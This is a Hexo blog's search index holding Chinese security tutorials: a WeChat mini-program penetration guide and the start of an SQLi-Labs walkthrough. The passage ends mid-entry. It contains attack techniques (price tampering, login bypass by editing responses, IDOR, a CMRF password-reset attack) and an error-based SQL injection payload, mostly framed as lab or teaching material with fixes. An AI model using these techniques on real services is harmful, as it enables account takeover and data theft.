<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>小程序渗透</title>
      <link href="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/"/>
      <url>/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="小程序渗透"><a href="#小程序渗透" class="headerlink" title="小程序渗透"></a>小程序渗透</h1><p>环境&amp;软件：Windows11渗透版，微信，微信开发者工具，UnpackMiniApp，wxappUnpacker，Node.js</p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>工具：burpsuite，Charles</p><p>配置：</p><p>Charles：</p><p><strong>导入证书</strong></p><p>依次选择</p><p><strong>Help-&gt;SSL Proxying-&gt;Install Charles Root Certificate</strong></p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213142141503.png" alt="image-20250213142141503"></p><p>在弹出的窗口选择安装证书</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213142206674.png" alt="image-20250213142206674"></p><p>存储位置选择本地计算机</p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213142226862.png" alt="image-20250213142226862" style="zoom:50%;"><p>将证书存放入受信任的根证书颁发机构</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213142250382.png" alt="image-20250213142250382"></p><p>导入成功后进行下一步</p><p><strong>代理端口</strong></p><p>点击proxy</p><p>然后点击proxy setting</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213143731805.png" alt="image-20250213143731805"></p><p>HTTP Proxy内修改Port为8888</p><p>SOCKS Proxy内修改Port为8889</p><p>最下方Ports内填写80,443,8080</p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213143758781.png" alt="image-20250213143758781" style="zoom:50%;"><p><strong>规则配置</strong></p><p>点击Proxy，选择SSL Proxying Settings</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213143830613.png" alt="image-20250213143830613"></p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213143938289.png" alt="image-20250213143938289" style="zoom:50%;"><p>点击左侧框下的add</p><p>两个都设置为*号</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213144105428.png" alt="image-20250213144105428"></p><p>点击ok</p><p>点击如下选项</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213150241466.png" alt="image-20250213150241466"></p><p>按照如下设置（Web Proxy和Secure Web Proxy都要设置成127.0.0.1:8091）</p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213150127829.png" alt="image-20250213150127829" style="zoom:50%;"><p>点击ok，配置完成</p><p>burpsuite：</p><p>点击<strong>代理-&gt;代理设置</strong></p><p>在代理监听器下点击添加</p><p>将绑定端口修改为8091，完成即可</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213145310676.png" alt="image-20250213145310676"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>打开bp</p><p>打开小程序（这里以畅行温州作为举例）</p><p>开启拦截</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213150508841.png" alt="image-20250213150508841"></p><p>点击小程序任意按钮</p><p>抓取到信息，发送到重发器</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250213150559183.png" alt="image-20250213150559183"></p><p>抓包成功</p><h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><h4 id="支付业务逻辑漏洞"><a href="#支付业务逻辑漏洞" class="headerlink" title="支付业务逻辑漏洞"></a>支付业务逻辑漏洞</h4><p>解析：应用程序未校验订单数据的取值范围，导致可以修改订单数量、订单金额，通过修改订单金额可以达到0元购的效果</p><p>案例：某酒店订房小程序在生成订单支付二维码时，客户端可以直接修改交易金额导致实际支付金额与商品原价不符，造成商家严重亏损</p><p>建议：1、服务器端在生成交易订单时，商品的价格从数据库中取出，禁止使用客户端发送的商品价格。2、服务器端对客户端提交的交易数据（如商品ID、商品数量、商品价格等）的取值范围进行校验，将商品ID和商品价格与数据库中的数据对比校验，商品数量为大于零的整型数。3、服务器端在生成支付订单时，对支付订单中影响支付金额的所有因素（比如商品ID、商品数量、商品价格、订单编号等）进行签名，对客户端提交的支付订单进行校验</p><h4 id="前端绕过登录后台漏洞"><a href="#前端绕过登录后台漏洞" class="headerlink" title="前端绕过登录后台漏洞"></a>前端绕过登录后台漏洞</h4><p>解析：登录页面输入账号密码后用户可以通过拦截并修改响应包实现绕过登录</p><p>案例：某公司小程序使用账号密码登录，随意输入一个账号密码并抓包，拦截响应包，修改json数据，将”code”修改为0，两个false修改为true，修改后放行，成功登录，并可以直接进入工作台，但是由于未授权访问，只能拿到数据，没有办法进一步操作。</p><p>建议：1、后台直接比对数据库判断用户账号密码是否正确，删除前端控制登录状态的<code>code</code>字段。2、所有API接口启用HTTPS，防止中间人攻击篡改数据包。3、基于角色分配最小权限，敏感操作需二次鉴权。4、记录登录IP、设备指纹，对频繁失败尝试触发风控</p><h4 id="水平越权漏洞"><a href="#水平越权漏洞" class="headerlink" title="水平越权漏洞"></a>水平越权漏洞</h4><p>解析：越权访问，这类漏洞是指应用在检查授权（Authorization）时存在纰漏，使得攻击者在获得低权限用户帐后后，可以利用一些方式绕过权限检查，访问或者操作到原本无权访问的高权限功能。</p><p>案例:</p><p>查看某房产小程序个人房产信息，在点击查看详情时拦截数据包，通过修改get传参可以遍历他人房产，并且可以获取他人id、手机号、身份证号码、房屋信息等数据</p><p>建议：验证用户权限，在每个敏感操作之前，对用户进行严格的权限验证。确保用户拥有访问特定资源或数据的权限，且只能访问其授权的内容。</p><h4 id="任意用户注册漏洞"><a href="#任意用户注册漏洞" class="headerlink" title="任意用户注册漏洞"></a>任意用户注册漏洞</h4><p>解析：小程序为内部员工专用，注册功能未对外开发，攻击者可以根据此漏洞越过系统拦截直接注册任意用户并访问内部员工功能。暂不排除是否会对已存在的用户的影像，如覆盖账号导致无法登录等</p><p>案例：某公众号员工登录页面，此页面无注册功能，且登录逻辑为员工姓名+工号校验，输入任意姓名工号发现登录不进去，将登录接口LoginSubmit修改为注册接口registerSubmit（猜的），发现注册成功并能登录进入系统。</p><p>建议：销毁此接口，或对员工注册进行审核。</p><h4 id="SessionKey三要素泄露"><a href="#SessionKey三要素泄露" class="headerlink" title="SessionKey三要素泄露"></a>SessionKey三要素泄露</h4><p>解析：session_key指的是会话密钥，可以简单理解为微信开放数据AES加密的密钥，它是微信服务器给开发者服务器颁发的身份凭证，这个数据正常来说是不能通过任何方式泄露出去的。小程序若存在session_key泄露漏洞的情况，则代表微信侧传递的用户数据有被泄露、篡改等风险，开发者应及时发现该漏洞并快速修复相应问题。</p><p>案例：某小程序因为session_key泄露，导致该小程序可以使用任意手机号进行登录，造成了极大的安全风险。</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/img-shentou4-1.png" alt="img-shentou4-1"></p><p>通过获取该session_key，我们可以结合iv解密出密文。</p><p>简单整个香香的小插件（不是）</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250214151727328.png" alt="image-20250214151727328"></p><p>把三个数据放到对应的位置上，点击解密，明文的敏感信息就显示出来了</p><h4 id="跨小程序请求伪造CMRF"><a href="#跨小程序请求伪造CMRF" class="headerlink" title="跨小程序请求伪造CMRF"></a>跨小程序请求伪造CMRF</h4><p>解析：利用小程序对用户微信身份的信任在获取页面传入的参数之后结合用户已经登录的身份信息（储存在本地的数据，或者用户的openid）向小程序后端发送对应的数据包，从而使用户在无意间（打开对应分享链接时）完成一次请求操作。</p><p>案例：某商城小程序中，用户来到“我的”页面时程序会自动登录向后端请求 <code>openID</code>等数据并判断当前微信用户是否已经进行了与商场网页账户的绑定操作，若无则前往绑定页面，若已经绑定则将 <code>openID</code>写入缓存之中。接着我们点击修改密码按钮，小程序会弹出如下让我们修改密码的弹窗，<img src="https://data.hackinn.com/photo/xcxstwm/0x03%20%E5%A6%82%E6%84%8F%E7%AF%87/%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E6%8C%89%E9%92%AE_resultat.png" alt="image-20200425173955039"></p><p>对应功能的JS代码如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">passFn</span>(<span class="params"></span>) &#123;    <span class="comment">// 修改密码弹窗</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123; <span class="attr">close</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">closeFn</span>(<span class="params"></span>) &#123;     <span class="comment">//关闭修改密码的弹层</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123; <span class="attr">close</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">passinput1Fn</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> value = e.<span class="property">detail</span>.<span class="property">value</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">    <span class="attr">pass1</span>: value</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">passinput2Fn</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> value = e.<span class="property">detail</span>.<span class="property">value</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">    <span class="attr">pass2</span>: value</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">changeFn</span>(<span class="params">e</span>) &#123;     <span class="comment">//前往修改密码页面</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">pass1</span> != <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">pass2</span>) &#123;</span><br><span class="line">    wx.<span class="title function_">showModal</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;提示&quot;</span>,</span><br><span class="line">      <span class="attr">content</span>: <span class="string">&quot;两次密码不一致！&quot;</span>,</span><br><span class="line">      <span class="attr">showCancel</span>: !<span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    wx.<span class="title function_">navigateTo</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&quot;/pages/my/changepwd?newpwd=&quot;</span> + <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">pass1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>可以看到上述JS代码中<code>changeFn</code>会判断用户两次输入的密码是否一致，若一致则将用户输入的密码作为参数传入小程序的“&#x2F;pages&#x2F;my&#x2F;changepwd”页面中。接着我们来到“&#x2F;pages&#x2F;my&#x2F;changepwd”观察其核心功能函数如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">onLoad</span>: <span class="keyword">function</span> (<span class="params">options</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> newpwd = options.<span class="property">newpwd</span>; <span class="comment">//获取传入的密码</span></span><br><span class="line">  <span class="keyword">let</span> that = <span class="variable language_">this</span>;</span><br><span class="line">  wx.<span class="title function_">getStorage</span>(&#123; <span class="comment">//从Storage中获取绑定用户的openid</span></span><br><span class="line">    <span class="attr">key</span>: <span class="string">&#x27;openid&#x27;</span>,</span><br><span class="line">    <span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">      wx.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://demo.c-est.cool/ThorSRC/changepwd.php?pwd=&#x27;</span> + newpwd + <span class="string">&#x27;&amp;openid=&#x27;</span> + res.<span class="property">data</span>,</span><br><span class="line">        <span class="attr">header</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (res.<span class="property">data</span>.<span class="property">code</span> == <span class="string">&#x27;000&#x27;</span>) &#123; <span class="comment">//代表绑定成功</span></span><br><span class="line">            that.<span class="title function_">setData</span>(&#123;</span><br><span class="line">              <span class="attr">chgstu</span>: <span class="literal">true</span>,</span><br><span class="line">              <span class="attr">changeinfo</span>: res.<span class="property">data</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            that.<span class="title function_">setData</span>(&#123;</span><br><span class="line">              <span class="attr">chgstu</span>: <span class="literal">false</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>小程序会将传入的密码和保存在本地Storage中的与对应商城用户绑定的微信用户openid值一起传回给后端服务器，服务器后端通过查询openid对应的用户信息来修改对应用户的密码。那么我们只需要构造一个微信小程序的页面指向<code>/pages/my/changepwd.html?newpwd=XXX自己预设密码</code>,并让其他已绑定商城账户的人点击我们构造好的微信小程序消息，那么他在此商城的密码就会被自动更改为我们预设的值。例如下图我们将<code>&lt;pagepath&gt;</code>值设置为：<code>/pages/my/changepwd.html?newpwd=Abc@123456</code>，预设密码即为<code>Abc@123456</code>：</p><p><img src="https://data.hackinn.com/photo/xcxstwm/0x03%20%E5%A6%82%E6%84%8F%E7%AF%87/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%81%8A%E5%A4%A9%E6%B6%88%E6%81%AF%E4%BF%AE%E6%94%B9%E6%88%AA%E5%9B%BE_resultat.png" alt="image-20200425195246501"></p><p>接着我们将构造好的消息转发给被害者，诱导其点击小程序消息访问对应的页面，一但用户点击了对应的消息页面打开微信小程序，他的商城账户密码即被修改为了<code>Abc@123456</code>。</p><p>至此我们完成了一次典型且易被利用的<strong>CMRF</strong>攻击，虽然并不是所有的CMRF攻击都能造成非常严重的危害，但这类漏洞并非无稽之谈，目前在很多微信或者其他小程序中还隐藏着许多类似的脆弱点。</p><h3 id="小程序反编译"><a href="#小程序反编译" class="headerlink" title="小程序反编译"></a>小程序反编译</h3><p>工具：node.js、反编译的脚本、小程序包解密工具</p><p>链接：<a href="https://blog.csdn.net/Xm3333691/article/details/120312160">https://wwn.lanzouj.com/i7opW0bnop4d</a> 密码:71g7</p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>先把反编译脚本文件夹放在根目录下，推荐放C盘，一是便于操作，二是避免了路径名存在中文字符</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250214163743624.png" alt="image-20250214163743624"></p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>找到自己想要编译的小程序包，位置跟微信聊天文件的位置是同一个大文件夹下，我的目录是<code>D:\WeChatCaches\WeChat Files\Applet</code></p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250214163935030.png" alt="image-20250214163935030" style="zoom:50%;"><p>里面有很多以wx开头的数字与字母组合的文件夹，点进去还有一个以数字命名的文件夹，再点进去，会发现有一个<code>__APP__.wxapkg</code>的文件，有的还有其他的文件</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250214164537587.png" alt="image-20250214164537587"></p><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>打开小程序解密程序（可能会弹出.NET Framework弹窗，点击安装即可）</p><p>打开后的效果</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250214164747647.png" alt="image-20250214164747647"></p><p>安装完打开解密程序，点击唯一的一个按钮“选择加密小程序包”，将想反编译的程序包的所在目录粘过去，点击打开，进行解密</p><h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><p>解密完成后，解密好的包会在解密程序上面或者下面的wxpack的目录里面，进去发现会有一个以wx开头的数字与字母组合的文件，他就是我们要反编译的包。</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250214165152553.png" alt="image-20250214165152553"></p><h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><p>为了方便操作，将解密好的包放在反编译脚本文件夹下</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250214165320604.png" alt="image-20250214165320604"></p><h4 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h4><p>安装node环境，为避免麻烦，所有步骤都默认进行</p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250214165517696.png" alt="image-20250214165517696" style="zoom:50%;"><p>打开cmd，为了避免出现问题，建议用管理员身份打开。<br>先用<code>node -v</code>看看能不能查看node版本，确保能使用node环境。</p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250214165602224.png" alt="image-20250214165602224" style="zoom: 67%;"><p>使用cd 命令，将位置改成脚本所在位置。</p><p>这里有个问题，如果当时放的是D盘，你会发现你使用<code>cd d:</code>就显示个<code>D:\</code>就完了，下面还是你的C盘用户路径</p><p>输入<code>cd /d d:</code>即可</p><h4 id="第七步"><a href="#第七步" class="headerlink" title="第七步"></a>第七步</h4><p>安装依赖，就在反编译脚本目录下安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install esprima</span><br><span class="line">npm install css-tree</span><br><span class="line">npm install js-beautify</span><br><span class="line">npm install uglify-es</span><br><span class="line">npm install vm2</span><br><span class="line">npm install cssbeautify</span><br></pre></td></tr></table></figure><p>如果卡进度条不动的情况就ctrl+c然后重新执行一遍</p><h4 id="第八步"><a href="#第八步" class="headerlink" title="第八步"></a>第八步</h4><p>安装完成之后，执行反编译命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node wuWxapkg.js 你粘过来的文件的文件名.wxapkg</span><br></pre></td></tr></table></figure><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250217081616925.png" alt="image-20250217081616925"></p><p>发现报错，不要紧，注意Error这句话的结尾单词<code>escodegen</code>，这就是缺少的模块，npm安装就完了</p><p>装完运行还是报错，哪个缺装哪个，直到开始跑代码就说明成功了</p><p>PS：如果发现缺少一个名为cheerio的模块，<strong>不要直接用npm下载！！！</strong>打开下面的链接，复制网页右边的下载代码粘贴到命令提示符下就可以了。不要不听劝啊，看到<code>Error: Cannot find module &#39;node:stream&#39;</code>你就老实了</p><p>链接：<a href="https://www.npmjs.com/package/cheerio/v/1.0.0-rc.2">cheerio - npm</a></p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250217090756393.png" alt="image-20250217090756393"></p><p>在目录中会生成一个文件夹，里面就是反编译后的文件</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250217090845165.png" alt="image-20250217090845165"></p><p>打开微信开发者工具，导入刚刚反编译的wx开头的文件夹，就可以看到小程序的真实代码了</p><p><img src="/2025/02/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20250217091838852.png" alt="image-20250217091838852"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLi-Labs通关手册</title>
      <link href="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/"/>
      <url>/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLi-Labs通关手册（Less-1-Less-65）"><a href="#SQLi-Labs通关手册（Less-1-Less-65）" class="headerlink" title="SQLi-Labs通关手册（Less-1~Less-65）"></a>SQLi-Labs通关手册（Less-1~Less-65）</h1><p>编写人：Rannnn</p><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>本手册为线上资料加自己的见解编写而成，手册中的所有代码都已经在环境内试验过，如有误<strong>请见谅并反馈给我</strong>，我会进行更正</p><h2 id="第一部分：Basic-Injections"><a href="#第一部分：Basic-Injections" class="headerlink" title="第一部分：Basic Injections"></a>第一部分：Basic Injections</h2><h3 id="Less-1："><a href="#Less-1：" class="headerlink" title="Less-1："></a>Less-1：</h3><p>首先输入<code>?id=1</code>查看页面回显，</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719204303838.png" alt="image-20240719204303838"></p><p>判断是否为字符型或整数型注入</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719204411872.png" alt="image-20240719204411872"></p><p>判断出为字符型注入，下面判断列数</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719204838226.png" alt="image-20240719204838226"></p><p>得知列表有三列，下面查看页面显示位</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719210526212.png" alt="image-20240719210526212"></p><p>得知2和3用于显示用户名和密码，下面利用这两个回显位查看数据库用户和数据库名</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719204953697.png" alt="image-20240719204953697"></p><p>得知数据库名为security，下面开始爆表和字段</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719205132436.png" alt="image-20240719205132436"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719205224860.png" alt="image-20240719205224860"></p><p>爆出内容</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719205438137.png" alt="image-20240719205438137"></p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>判断字符型还是数字型注入</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719210207776.png" alt="image-20240719210207776"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719210225475.png" alt="image-20240719210225475"></p><p>当输入单引号或者双引号可以看到报错，且报错信息看不到数字，所有可以猜测sql语句应该是数字型注入，直接爆列数</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719211523251.png" alt="image-20240719211523251"></p><p>得知表格列数有3列，查看回显位</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719211616883.png" alt="image-20240719211616883"></p><p>利用回显位查看数据库用户和数据库名</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719211918336.png" alt="image-20240719211918336"></p><p>爆数据表</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719212017629.png" alt="image-20240719212017629"></p><p>爆字段名</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719212116281.png" alt="image-20240719212116281"></p><p>爆数据表内容</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240719212154334.png" alt="image-20240719212154334"></p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>判断字符型还是数字型</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240720164539177.png" alt="image-20240720164539177"></p><p>发现当加入单引号时报错提示需要括号闭合</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240720164919919.png" alt="image-20240720164919919"></p><p>正常显示，以此为基础，判断列表列数</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240720165005542.png" alt="image-20240720165005542"></p><p>列表数3列，判断回显位</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240720165051321.png" alt="image-20240720165051321"></p><p>爆数据库用户和数据库表</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240720165135098.png" alt="image-20240720165135098"></p><p>爆数据表</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240720171629936.png" alt="image-20240720171629936"></p><p>爆字段名</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240720171732538.png" alt="image-20240720171732538"></p><p>爆数据内容</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240720171852423.png" alt="image-20240720171852423"></p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>判断字符型还是数字型，当输入双引号时，提示报错，加入括号闭合后正常，输入1&#x3D;2后无回显，判断为字符型</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722081717729.png" alt="image-20240722081717729"></p><p>查看列表列数</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722081850497.png" alt="image-20240722081850497"></p><p>列表列数3列，查看回显位</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722081931857.png" alt="image-20240722081931857"></p><p>查看数据库名和数据库用户</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722082016872.png" alt="image-20240722082016872"></p><p>爆数据库表</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722082111035.png" alt="image-20240722082111035"></p><p>爆数据表字段</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722082147738.png" alt="image-20240722082147738"></p><p>爆数据内容</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722082224069.png" alt="image-20240722082224069"></p><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>判断字符型还是数字型，这一关与其他不同，输入的id正确回显<code>You are in………</code>，错误则不回显</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722082246891.png" alt="image-20240722082246891"></p><p>在末尾输入单引号后则输出报错信息</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722083220330.png" alt="image-20240722083220330"></p><p>继续输入<code>order by 4 --+</code>后得知列表列数有3列</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722083341738.png" alt="image-20240722083341738"></p><p>此题可用报错注入的方式进行解题，**updatexml()**函数+**concat()**：拼接特殊符号和查询结果。成功查询数据库用户信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(1,(select user())),1)--+</span><br><span class="line">#以下代码根据这条中的select user()进行更改</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722083454642.png" alt="image-20240722083454642"></p><p>继续查看数据库名</p><figure 